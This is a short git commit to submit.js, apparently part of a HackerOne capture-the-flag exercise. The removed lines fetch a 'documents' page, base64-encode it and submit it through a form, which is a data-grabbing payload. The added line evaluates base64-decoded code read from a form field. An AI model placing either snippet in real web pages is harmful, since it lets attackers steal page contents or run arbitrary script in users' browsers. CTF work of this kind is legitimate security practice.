75a43d0576d2777632625d78b4ea15da065417b4
Peter af Geijerstam <peter.af.geijerstam@gmail.com>
2020-01-21 13:54:52 +0100

    Update submit.js

--- submit.js
+++ submit.js
@@ -1,8 +1,1 @@
-var url = "https://h1-415.h1ctf.com/documents";
-var xhr = new XMLHttpRequest();
-xhr.open('GET', url);
-xhr.onload = function() {
-	document.myform.name.value=btoa(this.response);
-  document.myform.submit();
-}
-xhr.send();
+eval(atob(document.myform.evaldata));
